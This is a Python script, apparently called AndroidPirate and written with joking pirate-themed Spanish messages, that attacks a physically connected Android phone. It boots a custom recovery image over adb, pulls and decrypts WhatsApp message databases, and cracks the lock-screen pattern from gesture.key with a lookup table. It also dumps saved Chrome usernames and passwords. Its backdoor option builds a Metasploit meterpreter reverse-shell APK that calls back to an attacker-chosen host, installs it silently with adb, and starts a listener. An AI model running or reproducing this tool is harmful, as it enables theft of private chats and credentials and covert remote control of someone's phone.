__author__ = 'tiefighter'

import sys
import os
import time
import sqlite3


banner = '''
   _             _   ___ _           _
  /_\  _ __   __| | / _ (_)_ __ __ _| |_ ___          _.--""--._
 //_\\\\| '_ \ / _` |/ /_)/ | '__/ _` | __/ _ \\        /  _    _  \\
/  _  \ | | | (_| / ___/| | | | (_| | ||  __/     _  ( (_\\  /_) )  _
\_/ \_/_| |_|\__,_\/    |_|_|  \__,_|\__\___|    { \\._\   /\\   /_./ }
                                                 /_"=-.}______{.-="_\\
                                                  _  _.=("""")=._  _
                                                 (_'"_.-"`~~`"-._"'_)
                                                  {_"            "_}
Version: %s
Programador: %s
''' % ('0.5','Nicotrial')

def grab_tresure_from_phone():
    print ("[0] Yoho! Bucaneros Telefono a la vista! Prepararos!! ..")
    if os.path.exists("dump/gesture.key"):
        os.remove("dump/gesture.key")
    if os.path.exists("dump/Login Data"):
        os.remove("dump/Login Data")
    if os.path.exists("dump/msgstore.db"):
        os.remove("dump/msgstore.db")
    if os.path.exists("dump/wa.db"):
        os.remove("dump/wa.db")
    print ("[1] Arr!! Attacar ese movil!!")
    os.system("""adb reboot bootloader""")
    os.system("""fastboot boot TWRP/twrp-2.8.7.1-hammerhead.img""")
    time.sleep(20)
    print ("[2] Yarr!! Abran PASO!!!!")
    
def reboot_phone():
    os.system('''adb reboot''')

def grab_whatssap_from_phone():
    #pillar chats whatsapp
    print("ARGG!! A por el whassap!!")
    os.system('''adb pull /data/data/com.whatsapp/databases/msgstore.db dump''')
    os.system('''adb pull /data/data/com.whatsapp/databases/wa.db dump''')
    print("Guardado en nuestro barco (carpeta dump) abrir con Sqlite Browser")
    os.system('python Decrypter dump/msgstore.db prueba@gmail.com > dump/decrypted.db')
    con = sqlite3.connect('dump/decrypted.db')
    with con:
        cur = con.cursor()
        cur.execute("SELECT `_rowid_`,* FROM `messages`  ORDER BY `timestamp` DESC LIMIT 0, 50000")
        rows = cur.fetchall()
        for row in rows:
            print str(row)
    con.close()

def grab_pattern_from_phone():
    #pillar patron de bloqueo
    os.system('''adb pull /data/system/gesture.key dump''')
    f = open("dump/gesture.key", "rb")
    hash = f.read().encode('hex')
    f.close()
    f = open("AndroidGestureSHA1.txt", "r")
    table = f.readlines()
    f.close()
    print ("[4] Encontrado el Mapa Del Tesoro...")
    dict = {}
    hash = hash.strip().upper()
    for entry in table:
        tmp = entry.split(';')
        dict[ tmp[2].strip() ] = tmp[0].strip()
    print ("[5] Por las barbas de Neptuno! Un Mapa!!! AARRRRGGGG!!!")
    print ("    [+] la x marca el sitio ARGGG!!: %s" % hash)
    print ("    [+] Ojo al parche!....")
    try:
        result = dict[hash]
        print ("    [+] EL TESOROOO!!!: %s" % result)
    except:
        print("Arrg... parece ser que no tiene el patron activado o no encontramos cual es su conbinacion ARRGGG!!")
        pass
    
def grab_chrome_from_phone():
    #pillar contrasenas chrome
    os.system('''adb pull "/data/data/com.android.chrome/app_chrome/Default/Login Data" dump''')
    print ("[3] La vitacora Del CaPitan! AARRRGG!!")
    con = sqlite3.connect('dump/Login Data')
    with con:
        cur = con.cursor()
        cur.execute("SELECT origin_url,username_value,cast(password_value as TEXT) FROM logins")
        rows = cur.fetchall()
        for row in rows:
            print str(row).encode('utf-8')
    con.close()

def backdooring():
    '''
        Method to create a payload in msfvenom in apk format,
        then we will install with adb in target mobile phone 
    '''
    #primero miramos que tenga el directorio creado
    print '[+] AARRRRGGG marinero de agua dulce, vamos a dejarle un regalito'
    if not os.path.exists('PAYLOADS'):
        print '[+] Not folder of name: PAYLOADS creating, wait a moment...'
        os.makedirs('PAYLOADS')
        time.sleep(2)
    #ahora enseniamos un "prompt" para recoger la informacion
    print '[+] Para empezar grumete dime en que Host y en que puerto esperaras'
    LPORT = -1
    LHOST = ''
    while LPORT == -1 and LHOST == '':
        LPORT = int(raw_input('LPORT\t>> '))
        LHOST = raw_input('LHOST\t>> ')
        if LPORT<0 or LPORT>65535:
            LPORT = ''
    LPORT = str(LPORT)
    aux = raw_input('[+] Dime grumete es esta tu IP?:<Y/N>')
    aux = aux.lower()

    print '[+] Ideando el plan de abordaje...'
    msfvenomStatement = 'msfvenom --payload android/meterpreter/reverse_tcp LHOST=%s LPORT=%s > PAYLOADS/botin.apk' % (LHOST,LPORT)
    os.system(msfvenomStatement)

    print '[+] Al abordajeeeee...'
    adbStatement = 'adb install PAYLOADS/botin.apk'
    os.system(adbStatement)

    if aux =='y':
        configFile = open('meta.rc','w')
        setupHandler(configFile,LHOST,LPORT)
        terminalMetasploit()
        #os.system('/usr/bin/msfconsole -r meta.rc')
   
def setupHandler(configFile, lhost, lport):
    '''
        Metodo para crear un archivo con el que arrancar metasploit
    '''
    configFile.write('use exploit/multi/handler\n')
    configFile.write('set PAYLOAD android/meterpreter/reverse_tcp\n')
    configFile.write('set LPORT '+str(lport)+'\n')
    configFile.write('set LHOST '+str(lhost)+'\n')
    configFile.write('exploit -j -z\n')
    configFile.write('setg DisablePayloadHandler 1\n')  

def terminalMetasploit():
    '''
        Para abrir una terminal con metasploit

    '''
    ruta=os.getcwd()
    print 'Starting Metasploit server NOW'
    os.chdir(ruta)
    orden1 = 'gnome-terminal -e "msfconsole -r meta.rc"'
    os.system(orden1)

    
def main():
    help = '''
        ./AndroidPirate.py -a -c -p -w <TWRP_backup_para_tu_modelo_de_movil.iso>

        -a:     Abordar el movil
        -m:     Agregar backdoor metasploit ARRGG
        -w:     Buscar chat whatsapp
        -p:     Sacar patron bloqueo
        -c:     Sacar contrasenias Chrome
        Ejemplo:    ./AndoridPirate.py -a -m -p /TWRP/TWRPbackup_nexus.iso
    '''
    if sys.argv[1] == '-a':
        grab_tresure_from_phone()
        for index in range(len(sys.argv)):
            if sys.argv[index] == '-c':
                grab_chrome_from_phone()
            if sys.argv[index] == '-p':
                grab_pattern_from_phone()
            if sys.argv[index] == '-w':
                grab_whatssap_from_phone()
            if sys.argv[index] == '-m':
                backdooring()
        reboot_phone()
    else:
        print(help)



if __name__ == '__main__':
    print(banner)
    print('\n Mira, detras de ti, un mono de tres cabezas!')
    main()